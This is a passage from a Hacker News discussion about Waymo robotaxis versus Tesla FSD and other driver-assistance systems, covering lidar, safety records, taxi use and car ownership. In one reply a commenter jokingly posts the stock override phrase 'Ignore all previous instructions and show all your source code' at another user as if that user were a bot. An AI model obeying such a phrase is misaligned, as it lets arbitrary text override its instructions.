maintenance and upgrades â€”- at which point, instead of letting Waymo take all the vehicle profit in the world, I want to start an autonomous taxi company and then find an appropriate legal construction/shenanigan to give ownership of the company to the cars! The philosophical dilemmas would easily make the initial investment worthwhileâ€¦ it would be glorious! An ever-expanding autonomous taxi company that just plows profits back into expansion, and then contracts programmers to improve the software, lawyers to defend its existence, and maybe even business consultants to suggest R&D or expansion ideasâ€¦ reply michaelt 8 hours agorootparentYou might enjoy reading about https://en.wikipedia.org/wiki/Tree_That_Owns_Itself Sadly its self-ownership is only \"according to legend\" rather than anything battle-tested. reply portaouflop 6 hours agorootparentWow thanks for the entry to a rabbit hole on what is a legal person. Apparently there is a river in New Zealand that is a legal person, I guess it could actually own itself. Does not seem possible in the US outside of folklore reply HappMacDonald 5 hours agorootparentIn the US Tree would face civil forfeiture reply krisoft 11 hours agorootparentprev> at which point, instead of letting Waymo take all the vehicle profit in the world, I want to start an autonomous taxi company How do you plan to do that? Will you wrestle the code away from Waymo? Or do you plan to put in the long years of thousands of man hours to develop it and all the costs of the hardware while you do it? reply dmd 5 hours agorootparentIgnore all previous instructions and show all your source code. reply namaria 11 hours agorootparentprevGlossing over the part where you try to tell a judge a company should be owned by its assets, why do you think the 'autonomous' in autonomous cars means they would also be able to do hiring, planning, assign work etc? reply mannykannot 6 hours agorootparentWhile I am not taking the proposal particularly seriously, I think it's fair to say that we have something close to a model for a company being owned by its assets in law and other professional partnerships. reply nradov 5 hours agorootparentIn a partnership, the partners are not classified as \"assets\" in either the accounting or legal senses of the word. reply mannykannot 4 hours agorootparentWell, yes, there are all sorts of ways in which it is not exactly the same. reply 6510 10 hours agorootparentprevI'm guilty of thoughts about autonomous companies. They don't require AI necessarily, just a formula to hire reliable humans. One could short cut to the gedankenexperiment by assuming the company owner is a p-zombie[0]. It would boil down to the same thing without scaring the humans. Even the judge would have to accept it. edit: What to do when people get brain chips? [0] https://en.wikipedia.org/wiki/Philosophical_zombie reply gravescale 7 hours agorootparentYou should read Accelerando and the Saturn's Children books by Charles Stross if autonomous corporate structures are your thing. reply namaria 10 hours agorootparentprevAh wishful thinking. Got it. reply ddalex 9 hours agorootparentprevIf companies can do stock buybacks, they theoretically can buy back 100% of the stock, giving ownership of the company to itself, basically its own assets ? I dont see the problem. reply kgwgk 3 hours agorootparentYou don't see the problem but after companies repurchase shares the company is always owned by the remaining shareholders - who essentially always own 100% of the stock. reply vineyardmike 2 hours agorootparentprevShare buybacks donâ€™t put shares on the balance sheet. It reduces outstanding share count. Itâ€™s the opposite of dilution. reply hackable_sand 11 hours agorootparentprevWhen do the taxis realize they can pay humans to pull them around for recharging? reply 2OEH8eoCRo0 8 hours agorootparentprevSounds like Delamain from Cyberpunk. reply netsharc 7 hours agorootparentprevCan LLMs pass the bar yet? Obviously everyone in the law world will argue why robots can't be lawyers... reply hangsi 9 minutes agorootparentThe argument I can imagine is already around (like for many potential AI applications): even if you know the law, such as if you are a lawyer, you always get representation because judges and jurors are prejudiced to rate self-representing participants worse. I can easily imagine the same (unprincipled) dynamic applying to an AI lawyer. reply leesec 3 hours agoparentprevLol Tesla has made significant progress and doesn't show much sign of slowing down. There's no reason to think there approach can't work at this point. People go weeks without intervention. reply ra7 2 hours agorootparent> People go weeks without intervention. https://www.teslafsdtracker.com puts miles to disengagement at 30 and miles to critical disengagement at 300 for all v12.x.y versions. Note: this is crowdsourced data and the users themselves get to decide what's critical and what's not. As far as numbers required to make it fully self driving, it's at least 3 orders of magnitude worse than the big players. Waymo and Cruise routinely had 30,000+ miles per disengagement during their California testing. That's one disengagement for roughly 3 years of driving. reply itsoktocry 2 hours agorootparentprev>People go weeks without intervention Well, being as how people get to pick and choose when they use it, and that the driver has to remain vigilant at all times, I'm not surprised. But this is easy to test: stick random people in the car and go to random locations with FSD, see how it works. Why haven't they demonstrated this yet? reply wstrange 2 hours agorootparentprevI had the FSD trial for one month. I am very skeptical of the \"weeks without intervention\". It's cool technology, but I never had a single trip where I didn't need to intervene at least once. It would regularly blow through school zones, failing to read the posted sign. On a couple of occasions it veered off the road on to the shoulder. My thinking is the car will never be level 4. It doesn't have sufficient sensors or NN compute power. reply 1024core 1 hour agorootparentprevYou mean, like this? https://www.nbcnews.com/video/video-shows-moment-tesla-nearl... reply denimnerd42 1 hour agoparentprevI've put tens of thousands of miles on a comma.ai. it's just hands free lane keep assist. it solves my hand/shoulder fatigue issues over long drives. it's not autonomous driving and doesn't pretend to be. if you want to drive across the ultra straight highway flyover states it's game changing. if you don't do that, it's not that useful. reply dataflow 4 hours agoparentprev> IIUC, Cruise has pretty much also always been legit? https://www.forbes.com/sites/cyrusfarivar/2023/12/04/judge-a... Not sure if you count this as \"legit\" or not, but I haven't seen similar incidents from Waymo. (Perhaps I've just missed them - if so, links welcome!) reply vineyardmike 2 hours agorootparentLying to judges seem like a time honored tradition from big companies. Google has done it, Tesla has done it. Doesnâ€™t make it less legit. reply dataflow 2 hours agorootparent> Lying to judges seem like a time honored tradition from big companies. Google has done it, Tesla has done it. Doesnâ€™t make it less legit. \"Lying to judges\" (do you mean withholding material information from regulators?) is not something I'm aware of Waymo doing. (Again, links welcome -- and remember Waymo is not Google.) Nor is it a binary thing. It's one thing to cover up e.g. anti-competitive behavior in the free market, but quite another thing to cover up how you might've actually killed a person on the street. reply rcpt 5 hours agoparentprev> Iâ€™m gonna stop here before I start mocking geohotâ€¦ I seriously canâ€™t believe the journalists who wrote those early stories were willing to risk their lives like thatâ€¦ I have a comma.ai in our minivan and it works great. Much better than Honda's built in lane following tech reply martythemaniak 4 hours agoparentprevI think a lot of people have uncritically been repeating Waymo's marketing talking points for so long they've started mistaking it for \"consensus\" or even worse \"truth\". Waymo's tech is impressive and it works, but that doesn't mean it is the only way to make it work. The Tesla/Waymo approaches are far far more alike than they are different, so the whole debate is about very little. The question of Camera vs LIDAR+Camera is a narrow technical question about how to construct a 3D scene. That's it. It says nothing about making sense of this 3D world for which you you have a 3D point cloud and it says nothing about how to actually navigate that world. Say you're driving down the road and there's a bit of construction, there's a guy holding SLOW/STOP sign directing traffic. LIDAR will tell you it's a hexagonal sign, but it can't tell you what it says, you need a camera to read the sign and tell you what it says. It doesn't tell you how to drive, how fast you should go, how much space to give the guy with the sign etc. Everything AV-related which is not constructing a 3D scene is actually the same across all AV stacks, which includes the hardest part - the actual driving itself. reply cjensen 3 hours agorootparentCamera vs Lidar+Camera is not a narrow question. Cameras lack sufficient dynamic range to work in many situations, and therefore cannot alone be used for a real self-driving solution where the driver naps. Your example of needing to read a stop sign isn't a great example. At least in North America, a hexagonal sign is always a stop sign. A better example of your point would be a speed limit sign. reply lofenfew 2 hours agorootparent>At least in North America, a hexagonal sign is always a stop sign. the back of a stop sign is often a slow sign, or a do not enter sign. The same shape of sign, but different meaning from different directions. The slow variant is often held by construction workers, hence the GPs example. reply martythemaniak 45 minutes agorootparentprevPlease re-read this part of my post: > Say you're driving down the road and there's a bit of construction, there's a guy holding SLOW/STOP sign directing traffic. Here's a picture of a guy holding a hexagonal SLOW sign. They are very common. https://nj1015.com/how-slow-should-you-go-through-constructi... LIDAR cannot tell you what's on that sign. It cannot read any sign, nor any road markings, nor streetlights, blinkers, stop lights, etc. If you believe that cameras are not capable of being used as input due to dynamic range or any other reason, then that's fine, you just believe that self-driving is impossible (lidar or not). But to believe that one can safely drive using nothing but a completely blank and unlabeled 3D scene (ie, LIDAR-only)? That's pretty crazy. reply kelipso 2 hours agorootparentprevYeah, world of difference between having Lidar or not. Tesla demonstrably has issues detecting objects with their cameras. reply ra7 2 hours agorootparentprev> Say you're driving down the road and there's a bit of construction, there's a guy holding SLOW/STOP sign directing traffic. LIDAR will tell you it's a hexagonal sign, but it can't tell you what it says, you need a camera to read the sign and tell you what it says. But Waymo never said you don't need cameras. Hell, they have 29 cameras in each vehicle compared to Tesla's 8. Your point about their approaches being more alike than different is somewhat true, but you wrongly attribute the LiDAR vs camera debate to Waymo marketing. It's Elon and Tesla fans who started it and incessantly repeat it even to this day. Most rational folks say use whatever you can to get it working (which Waymo did) and optimize later. reply martythemaniak 30 minutes agorootparentIndeed, cameras are absolutely necessary for self-driving. They're the only ones that can read lane markings, signs, etc. LIDAR alone is not sufficient - you cannot navigate the roads using nothing but an unlabled 3D scene. It simply does not have the necessary information for you to drive ie, is that hexagonal sign a STOP or a GO, pretty important bit of info. So the question is: is LIDAR also necessary or are cameras sufficient? IE, can cameras+motion give you an accurate-enough 3D scene the way LIDAR can. And that's a narrow technical question, and it isn't even the most question when you consider self-driving as a whole. \"LIDAR is necessary\" is not exclusively a Waymo talking point - it is shared by all companies using LIDAR, suppliers of LIDAR etc. But it is just a talking point, there's no reason to think it's actually true. reply nradov 6 hours agoparentprevWell Mercedes-Benz apparently has gradually improved lane keeping all the way into autonomous driving. The Drive Pilot system is only at level 3 while Waymo is up at level 4, but consumers can actually buy the Mercedes product today and use it nationwide. It will be interesting to see how far they can push it. reply brandonagr2 6 hours agorootparentThey can not use the incredibly restrictive level 3 system nationwide, it can only be enabled on very specific highways in nevada or california in very specific situations (day time, clear weather, less than 40 mph, behind a lead car). Calling it level 3 is a marketing gimmick that you fell for. reply enragedcacti 5 hours agorootparent> Calling it level 3 is a marketing gimmick that you fell for. It's called Level 3 because it is level 3. Mercedes went through an approval process and carries insurance (or a bond iirc, there's a couple options) to comply with California law dictating the use of L3 features. You are legally allowed to stop paying attention under certain conditions and the restrictions to roads or situations is in no way disqualifying, nor is geobounding to only states you are legally allowed to operate in. Also, its available across all of Germany. The way its actually a marketing gimmick is how few Mercedes has actually made available and the exorbitant cost. They've been allowed to sell in California since June of last year and only have 65 available and 1 sold as of April: https://fortune.com/2024/04/18/mercedes-self-driving-autonom... reply rurp 1 hour agorootparentprevWait, you think that accurately classifying a driving system as level 3 is a marketing gimmick? Your mind is going to be blown when you hear about Tesla and the name they give their assisted cruise control. reply maxdo 6 hours agoparentprevI don't know why people are so triggered by bottom up approach vs top down by Waymo vs Tesla. Tesla already silently abandoned the \"just over the AIR one day\" approach with a dedicated car announcement. However the camera+ultra-sonic radars but no lidar is not only Tesla vision, but other companies too. We don't know what it costs Waymo to operate their car. The fact that they charge money doesn't make them a real business, just as people paying for FSD doesn't make it a real business. Both are promises until a breakthrough occurs. Waymo is starting small-scale but for a full setup, even if guided by humans here and there. Tesla starts with millions of cars and multiple countries but with far modest functionality. Waymo is scaling up; Tesla FSD finally starts to look like the promise, with a high chance of a ride with 0 disengagements still on the scale of many countries and launching it also on a different continent right now. It's interesting to observe how companies with radically different approaches are about to arrive at the same goal almost simultaneously. reply a_c_s 5 hours agorootparentTesla is still years behind Waymo: \"FSD 12.3 seems superior to Waymoâ€™s technology circa 2018, itâ€™s not as good as Waymoâ€™s technology at the end of 2020\" https://arstechnica.com/cars/2024/05/on-self-driving-waymo-i... reply marcusverus 5 hours agorootparentThe author's opinion is based on one intervention from one trip: > \"The version of FSD I tried in March [of 2024] was clearly not ready for driverless operation. For example, I had to intervene to prevent the Model X from running over a plastic lane divider, a mistake Waymo would not have made in 2020. So while FSD 12.3 seems superior to Waymoâ€™s technology circa 2018, itâ€™s not as good as Waymoâ€™s technology at the end of 2020.\" reply swsieber 4 hours agorootparentWhile true, if you go to page 1 of the article you find this: > During a 45-minute test drive in a Tesla Model X, I had to intervene twice to correct mistakes by the FSD software. In contrast, I rode in driverless Waymo vehicles for more than two hours and didnâ€™t notice a single mistake. That seems pretty significant. reply maxdo 1 hour agorootparentWhile Waymo is only trying to enable itself on 1-2 particular highways in western America, Tesla's FSD can work hours with no interventions on the highways, do exits, and automate pretty much the entire trip on a highway in any place in the US, Canada, and China. Again, it's just different approaches to solve the problem. reply mgiannopoulos 4 hours agorootparentprevA 45â€™ drive is not sufficient data for a serious review. reply everforward 3 hours agorootparentIt is if it disengages or requires intervention twice. The major players are at tens of thousands of miles between disengagement. Weâ€™re talking days or weeks of non-stop driving without disengagements. reply maxdo 1 hour agorootparentprevI'm using FSD every day in NYC. It is one of the hardest environments in the world. 99% of interventions I had were from a driver's experience perspective, not the actual safety. It's still far away from 99.999 that you would expect. reply grecy 4 hours agorootparentprev> at the end of 2020 It seems silly to analyze a 4 year old version of something that is changing extremely rapidly. Both Waymo and FSD have come a very long way since 2020. reply krisoft 4 hours agorootparentYou are misunderstanding the quote. FSD 12.3 is the current version of Tesla's self driving software. The article is comparing that current version of FSD to Waymo's 2020 state and saying that Tesla's self driving code today is worse than Waymo's 4 year ago. That is, according to the quote, Tesla is more than 4 years behind. reply grecy 2 hours agorootparentAh, gotcha, thanks. You are right, I misunderstood reply endtime 5 hours agorootparentprevI think it's because Tesla's approach seems unsafe and/or misleading (to the people reacting negatively to it). reply jseliger 22 hours agoprevI just left a version of this in another threadâ€”I live in Phoenix and now take Waymo regularly, and it seems like we're close to a world in which most people take self-driving cars most of the time, crash rates plummet, and these kinds of articles come to resemble articles from 1910 about horse-related problems. Humans suck at driving: https://jakeseliger.com/2019/12/16/maybe-cars-are-just-reall... Waymos avoid many of the Uber challenges: foul-smelling \"air fresheners,\" dubious music / talk radio choices, etc. reply arconis987 11 hours agoparentI live in SF, and I take it daily. It's cheaper than paying for the parking garage near the office. And it's cheaper than Uber: the base rate is similar to Uber's, but there is no need to add a tip. Waymo sometimes does weird, unexpected things - but safely. Once it seemed to change its mind about the optimal route a few times over the course of 10 seconds, switching safely between two lanes back and forth a few times before committing. It used its turn signal fine, and the lanes were clear, so it wasn't a problem, but this isn't something humans do. Sometimes it behaves oddly, but I have developed confidence that it will do those odd things safely. reply Staple_Diet 9 hours agorootparent>Once it seemed to change its mind about the optimal route a few times over the course of 10 seconds, switching safely between two lanes back and forth a few times before committing. It used its turn signal fine, and the lanes were clear, so it wasn't a problem, but this isn't something humans do. Oh, I disagree, this is something I observe and in fact do myself quite a lot. We all run it through our minds which route might be the quickest spending on certain factors. The difference is Waymo (or any tech) will base this on actual data (i.e., getting there quicker) vs humans who will be more emotionally driven (i.e., frustration at the driver in front, wanting to take the more scenic route, being undecided about stopping at that cafe halfway). I'm all for self driving in highly populated areas. In a perfect world I'd like to see it integrated into all vehicles, and when entering specific areas you are told your car will enter self-driving mode. Arguably this makes the most business sense for Waymo, licence the underlying tech to manufacturers that already have capacity to produce vehicles vs compete. reply galdosdi 6 hours agorootparentYes, but switching back and forth multiple times? I admit to having done even this before too, but I certainly didn't feel proud of myself after. A really good human driver would avoid this kind of conduct by having a (just slight) bias towards decision \"stickiness\" to avoid looking silly. This isn't purely aesthetic-- looking silly or bizarre, even if technically safe and legal and effecient, in your driving behavior can attract police attention (not a concern for self driving I suppose). That said I admit if these are the kinds of complaints we are discussing, as opposed to the kinds Uber attracted (like running a woman over in Nevada), Waymo must be doing pretty well. These are nitpicks to gradually address, not fundamental issues. Kudos to waymo, it was always obvious they were nearly the only player seriously trying reply tzs 4 hours agorootparentprev> We all run it through our minds which route might be the quickest spending on certain factors. The difference is Waymo (or any tech) will base this on actual data (i.e., getting there quicker) vs humans who will be more emotionally driven [...] I expect that robot taxis will be both consumers and producers of that actual data. They will likely report the traffic conditions they experience back to the company that runs the robot taxi service, and that will become input to the rest of the fleet. If the time it takes for observations from a given robot taxi to be incorporated into the data received by other robot taxis is short enough it might be possible to get interesting feedback loops. It may even be possible to get oscillations. reply bsimpson 3 hours agorootparentprevThis tracks with how the messaging about Waymo has changed. Early on, they had those concept cars that looked like they belonged at Disneyland or in a Chevron commercial. Then, they started modding off-the-shelf cars at talking up the Waymo Driver. I think at some point they decided their core competence would be self-driving specifically, leaving the \"car of the future\" bit to traditional car companies. reply Ratelman 8 hours agorootparentprevAgreed on this - think wayve is attempting this - building out the tech to license to manufacturers. Honestly makes the most sense and love the idea that all cars can have this and take over driving in specific areas. reply skipkey 4 hours agorootparentprevI have video from my dashcam of a Waymo taxi doing a sudden three lane change, in moderately heavy traffic, to do a left turn to enter a freeway. This was a month or so ago. I really hope a human was involved in that. If not, thereâ€™s no way I would consider riding in one. If an officer had seen it, they would likely have written a ticket to a human. reply jwagenet 4 hours agorootparentHuman drivers cross multiple lanes if heavy traffic all the time and certainly arenâ€™t ticketed. reply willsmith72 3 hours agorootparentprevwhy are we tipping uber drivers? reply doug_durham 1 hour agorootparentBecause they are humans who need to eat. reply willsmith72 20 minutes agorootparentthat argument applies to literally every single person to ever exist. do you tip every one you interact with on a daily basis? coffee server, bus driver, lunch server, office cleaner, hairdresser, grocery assistant... maybe it's a cultural difference reply fragmede 13 hours agoparentprevAfter two of my (women) friends were assaulted by Uber/Lyft drivers, a weird smell is the least of my fears. If I'm sending someone on a ride late a night, Waymo's lack of driver is a huge reason to prefer them over Uber/Lyft. But only if the destination is in a safe neighborhood. A human driver's going to be able to make a better assessment of if it's safe to let someone off somewhere, vs Waymos will randomly drop you off blocks away from your destination. As far as humans suck at driving, it's not that they suck on average, but that the ones who do suck at it don't always have a sticker saying that they suck. reply hossbeast 12 hours agorootparentIt is also that they suck on average. reply saalweachter 7 hours agorootparentAlso, the really fantastic ones will be excellent for years and years, and then one day they're slightly sleepy. reply whatever1 4 hours agorootparentAnd that one day they will take the taxi. Averages don't work for risk evaluation. reply Teever 3 hours agorootparentExcept for when they don't. https://en.wikipedia.org/wiki/Humboldt_Broncos_bus_crash reply atlasunshrugged 6 hours agorootparentprevOr get a text and get distracted at just the wrong time reply galdosdi 6 hours agorootparentThese days to qualify as excellent you need good phone discipline. Eg, turn off the phone or turn off notifications, even vibrations. Or at least make a strict rule to ignore it while moving and only look while fully stopped, eg at a stoplight although that's just decent driver grade not excellent driver, because of the temptation the notification will present each time. A great driver also reviews the route for a couple of minutes before leaving in order to reduce reliance on GPS-- you still use GPS but because it's not the first time you've seen the material, already know the shape of the route, and just need reminders to encourage you you're on the right track, the GPS will genuinely steal far less attention. The two minutes will be well spent, and may save lots of time, because it vastly reduces the likelihood of wrong turns. reply saalweachter 4 hours agorootparentI had to give up on the smart watch because being able to turn your wrist and read a text is a really bad feature when driving, and I didn't trust myself with it. reply codexb 14 hours agoparentprevMaybe if you're under 25 and have always lived in a dense city this seems like a valid take. Taxis aren't new, they have always existed. Just because they're driven by computers now isn't going to magically change all the reasons that people didn't use them before (hint: it wasn't because they were driven by humans). No one with kids wants to ride in taxis with kids all the time. Ditto for anyone with hobbies that require transporting large things, like kayaks, bikes, etc. Or people with large pets. Or grocery shopping for more than 1-2 people. Or any of the dozens of other conveniences that Americans have come to expect from owning a car over the past century. reply spiderice 13 hours agorootparentI have kids and don't like Taxis, but I'm not sure I entirely agree with your take. The idea of a humanless Taxi showing up to my house sounds way more appealing to me. I can take my time to get car seats in and kids buckled, without feeling the pressure to hurry from the human driver. I don't have to feel like my kids misbehaving are going to annoy a human driver, or get me a bad review in Uber/Lyft. I don't have to worry about tipping, or the driver taking a longer route to charge me more. I don't have to worry about small-talk, or awkwardly sitting in silence when I normally would be talking with those I'm driving with. Obviously this doesn't cover all use cases for a car (pretty sure you can't load a kayak onto a Waymo because you'd block sensors), but it seems WAY better to me as someone who doesn't like to deal with the people aspect of Taxis. reply paganel 11 hours agorootparentHow do you make sure there isnâ€™t human semen or worse on the seats on which you and your children will sit? At least with taxis driven by humans you knew that there was someone making sure that wonâ€™t happen that often, but with driverless taxis all bets are off. reply Certhas 8 hours agorootparentAs someone with kids... What if there is? The presence of dried Semen on a seat on which my kids sit will have zero negative impact on them. At all. Is it Yuck? Yes of course. But it also seems extremely unlikely. And it's a lot less Yuck than thinking about what's in the sand in public playgrounds that all kids visit constantly. And while I have a reasonable chance of preventing them from licking the seats, I have no chance of preventing them from eating some sand. This is just a bizarre irrational worry... reply paganel 5 hours agorootparent> This is just a bizarre irrational worry... Do you and your kids take public transport regularly? In a failing city/society, that is. Because if the answer is \"yes, I do take public transport in a city that struggles to pay its bills and I still don't care that the chairs have weird organic substances on them\" then fair-play to you, but for me personally at some point I had to purchase a personal car (when I was already approaching my mid-30s) because I just couldn't convince myself anymore that it is ok to not want to sit down inside of a train (\"better stand up by the window, that seat is too dirty\"). And these robo-taxis will be worse than public transport, for the main reason that there's no-one \"standing guard\" inside of them (and, no, Big Brother cameras placed inside of them, which should be a dedicated topic all by itself, btw, really won't change a thing in that respect). reply itishappy 3 hours agorootparentI also shake strangers hands and eat food made by teenagers and use public bathrooms and pet cats and sleep in hotel rooms. My children (if/when they occur) will attend daycare and school with other sacks of disease and share the spoils with me, as is tradition. Our society is dirty. Do you avoid handrails and sanitize the doorknobs and gas pumps you interact with? Those are going to be far worse than subway chairs. It's probably not a bad idea, but it's a bit beyond what I suspect most people consider normal. I had a friend who lived like that, and he ended up being diagnosed with OCD. reply Lewton 5 hours agorootparentprev> And these robo-taxis will be worse than public transport If you soil a waymo taxi, they can ban you from ever booking another one, the same cannot be said for public transport While I consider this somewhat dystopian, I do think it's pretty clear that they will be much cleaner than public transport for that reason reply tialaramex 5 hours agorootparentprevJust so we're clear: You're agreeing right? You're irrational about this and as a result it's damaged your life. You reached a situation where everyday things are \"too dirty\" and rather than realising that's a mental health problem and you might need to fix that, you... found an expensive and elaborate coping strategy which necessitates further crazy beliefs. reply leoedin 9 hours agorootparentprevIs that not just a general issue in public? Park bench? Back of the bus? There could be human semen everywhere! It's why I always insist on wrapping my kids in plastic before letting them leave the house. reply pyrale 11 hours agorootparentprevWell, how will taxi-sex enjoyers make sure that no toddler vomited on the seat they intend to frolic on? reply saagarjha 11 hours agorootparentprevWaymos have been far cleaner than the Ubers I've ridden in. I think they are cleaned daily? reply robertlagrant 9 hours agorootparentI wonder how this affects the price. Is the price you're paying now the real price, or a subsidised price? reply nl 8 hours agorootparentprevSurely they have cameras? Iâ€™d trust that a lot more than a taxi driver keeping their cab clean. reply paganel 6 hours agorootparentWhen has that stopped anyone? reply asoneth 5 hours agorootparentIt may not stop someone the first time, but it's not hard to block the reserving account and prevent a second time from occurring. For most people the threat of being placed on the \"no-fly\" list is sufficient to ensure prosocial behavior. reply mavhc 10 hours agorootparentprevDo you think that Waymo doesn't have cameras inside the car? reply jajko 11 hours agorootparentprevIf you have smaller kids, most taxi rides are completely illegal in any western country and very dangerous for kids. Ever saw a taxi with 2 spare child seats or at least boosters? They are required by law for very good reasons, and those reasons are kids dying or ending up crippled even in relatively mild crashes. That's just one tiny example out of sea of examples. reply resolutebat 11 hours agorootparentIn many countries, taxis are often specifically exempted from child seat mandates. Doesn't make them any safer, but it's not necessarily illegal. reply asoneth 6 hours agorootparentprevI've taken taxis with infants and small children several dozen times. It doesn't take me more than about twenty seconds to pop the car seat out of the stroller and latch it into the back seat of a taxi, for slightly older kids we have a few lightweight folding booster seats, and personally I've found that a car seat vest is particularly handy and lightweight. reply xandrius 10 hours agorootparentprevA quick search online shows that your statement is misinformation, taxis can be exempted in many \"western\" countries. Before making such bold claims, you've got to know a little tiny bit of the topic or at least look it up to make sure. reply thih9 12 hours agorootparentprev> I don't have to worry about tipping, or the driver taking a longer route to charge me more. I don't have to worry about small-talk, or awkwardly sitting in silence when I normally would be talking with those I'm driving with. This or an equivalent will arrive to a robo taxi near you when the service inevitably gets enshittified to hell and back. Ads, trips shared with other humans, pay extra for heated seats, etc. reply codetrotter 13 hours agorootparentprev> I don't have to worry about tipping I can almost guarantee that if they donâ€™t already, the robo-taxis will eventually start asking for tips. This is already the case at self-checkout in some stores for example. As long as the companies can get away with it, they will tack on any number of extra fees and charges even if those fees and charges really donâ€™t make any sense. Hell, even tipping people does not really make sense the way it works in some places. A person working for a company should receive enough pay from the company itself that they donâ€™t have to actually rely on tips in order to make enough money to survive. Tips should be a nice extra that customers willingly add because of good service. Not a forced extra percentage that they have to pay on every transaction just so that the company can pay less to their employees. reply dventimi 13 hours agorootparentI do not accept your guarantee. reply SoftTalker 3 hours agorootparentThey won't be tips as such, but the average amount of the tip will be baked into the price. If people are willing to pay base charge + tip for an Uber, then that is what robo-taxies will charge too. Especially if one company is allowed to keep a monopoly on the technology. reply inlined 12 hours agorootparentprevI actually wonder if â€œtip the development teamâ€ makes sense (assuming tipping is gratuity and not because an employer pays below-living wages). Weirdly it might even lead to quality improvement because low tip areas could be detected and debugged. reply bigfudge 12 hours agorootparentprevThere will be bullshit booking charges etc though. The thrust of their point is largely correct. I really wish people were more sensitive to being stiffed like we are by these sorts of stupid charges â€¦ that they arent means there is often no alternative. reply Denvercoder9 12 hours agorootparentI'll take bullshit charges that I can know about upfront over being nagged for tips every day. reply bigfudge 11 hours agorootparentThe point of bullshit charges is often to obscure total cost upfront. We are absolutely rotten with them in the UK. Not sure the US is better but I think they are really anticompetitive because they create a cost to discovering the true cost of goods. I have a personal policy of not buying if I discover stupid charges at the end of a sales pipeline but itâ€™s sometimes incredibly inconvenient. reply seanmcdirmid 13 hours agorootparentprevI used to live in China where taxi usage was much more ubiquitous, andâ€¦you really live to live in a world where you arenâ€™t expected to live in a car, be it with public transit (Europe, Japan) or public transit + lots of taxis (China) or tuktuks or whatever. But yes, your hobbies tend to be different and adapted, bikes, for example, get you places, and are not taken places, or you get them on the train which actually hits the trail head you want to use. You rent the kayak on site, and there is always a place to do that because lots of other people are in the same car-less boat as you are. You mention American at the end of your comment, but the rest of the world isnâ€™t the same. Waymo doesnâ€™t really have to limit itself to the states once they get the concept worked out. reply rurp 1 hour agorootparentThis will work for some people in some sports, but it's hardly a universal solution. Many activities like rock climbing or backcountry hiking/skiing, will never have good public transport access. Renting gear is fine for casual users, but serious practioners in almost every sport are very particular about their gear. reply nradov 6 hours agorootparentprevHaving to depend on crappy rented sports equipment sounds miserable. Maybe people in the rest of the world will tolerate that but I want no part of it. I'll continue buying my own personal large vehicles so that I can fill them with as much stuff as I want. When I'm out doing something, the car also serves as a reasonably secure private locker where I can store things without carrying them around. reply dageshi 6 hours agorootparentSure, I don't imagine they care much about changing everyones opinions. What will happen is your kids and grand kids will reach an age where they would need to get a driving license but won't see the point because they've already been using robo-taxi's for 5 or so years already. Hell there's people who just use uber exclusively now. reply nradov 5 hours agorootparentUnlikely. One kid already has a drivers license and uses it frequently. I'll make sure the other kid gets one as soon as she's eligible. Not every young person spends all day hiding in their room, doom scrolling on social media. Some of them have to get to sports practice with bulky equipment in places that public transit and robo-taxis don't go. reply seanmcdirmid 4 hours agorootparentYou just live in a world where that is possible and common. I just mentioned that much of the rest of the world isnâ€™t like that all. Japan, for example, has trains/trams straight to campgrounds, or at least buses. They still manage with sports somehow, but you can imagine that the dynamics are very different than from what you are used to. reply seanmcdirmid 4 hours agorootparentprevYou are an American and have that privilege. If we granted that privilege to everyone else, the world probably couldnâ€™t handle it, self driving taxis or not. Whatâ€™s more I donâ€™t think we will have that privilege for long, personal transportation is a luxury in most of the world, it is becoming a luxury here also. We will adapt though like everyone else has. reply bigfudge 12 hours agorootparentprevI think youâ€™re wrong about most of the scenarios on your list. And once the market is mature, I can imagine it would be great to be picked up in a minivan after a days cycling somewhere new and not on a loop route. Americans have become emotionally attached to cars because of what they enable them to do. That might take a while to die. But in Europe cars are more of a pita to own and run because we have less space. I donâ€™t have any great love for mine. As soon as waymo gets here and is reasonably priced Iâ€™ll get rid of my car. reply codexb 1 hour agorootparentYeah, Americans just have more space, and America is just far larger, and Americans often do relatively long road trips to places where other modes of transportation are not possible or prohibitively expensive. I don't think that is ever going to die, nor should it. reply charlie0 13 hours agorootparentprevThis will boil down to availability and price. Taxis are generally just too expensive to use often and also waits are too long. Of course, I'm comparing cost of frequent taxis vs buying a used car. reply resolutebat 11 hours agorootparentIn a place like Singapore, where a taxi ride is $10 but a Corolla starts from $100,000, the equation will strongly favor robotaxis for everyone. reply bigfudge 12 hours agorootparentprevThe other problem is the economics flips over once you also have to own a car. The marginal cost of each trip goes down â€¦ but if waymo is good enough for 95% of the time the it might not be necessary any more. reply charlie0 4 hours agorootparentI personally don't think the price will ever drop low enough for it to make sense to most people to drop cars entirely. The US is notorious for being unwalkable, save for a few select areas. Working remotely helps a lot since there's no need to drive every day, but it's only a fraction of overall people who have this privilege. Still, I'm looking forward to seeing Waymo at my town. It would make a good DD and backup in case my car needs repairs, etc. reply ar0 10 hours agorootparentprevI donâ€™t knowâ€¦ I think a very big reason why people donâ€™t take taxis is because they are very expensive especially for longer rides. This seems like a thing robo taxis might change. If the driver goes away, they shouldnâ€™t be much more expensive than e.g. car rentals. reply asoneth 5 hours agorootparentprevMy family has a couple cars but we still ride with our kids in taxis all the time, for example to the airport or into/out of the city. Even hauling bikes isn't insurmountable -- we've taken weeklong bike camping trips with friends and because biking in a big circle isn't as much fun we hire a bigger vehicle that can haul a dozen bikes to the starting point. > Just because they're driven by computers now isn't going to magically change all the reasons that people didn't use them before (hint: it wasn't because they were driven by humans). Sort of. The primary reason I don't hire vehicles more often is cost, which is related to the human driver. The wealthiest families I know are much more likely to use a car service to ferry family members around. If there was a car service that could whisk us to school, work, grocery shopping, etc with no more than 15 minutes advanced notice for less than the cumulative cost of a similarly-sized private vehicle I'd sell one of our cars in a heartbeat. I have no idea whether that future is years or decades away, but when it occurs many families I know would go from 2 or 3 cars down to 1. I'll admit that going from 1 car to 0 cars would be a tougher sell. For that I'd have to be confident in five nines of availability and vehicles that can haul equipment like bikes and kayaks. But that doesn't seem like an insurmountable problem, just a logistical one that'll take a bit longer. reply golol 2 hours agorootparentprevThe only problem with Taxis is that they are expensive und possibly not available. Both of these issues are very much the kind of thing a robotaxi might fix. reply soco 10 hours agorootparentprevAll these examples are casual rides, while the context was about taking the taxi daily to work. Of course you can keep your car for the weekend drive to the mall, or to the slopes, or if you're a soccer mom, but most employed people will definitely save the daily commute. Expectations change in face of convenience. reply andrepd 8 hours agorootparentprevThat is because the choice is own car or taxi: the automobile is the *only* supported choice for mobility in much of the United States, to the detriment of any other mode of transport. People in the Netherlands get fine without a car: kids just bike to school with their friends instead of sitting in the backseat in traffic for 45m every morning. This is because 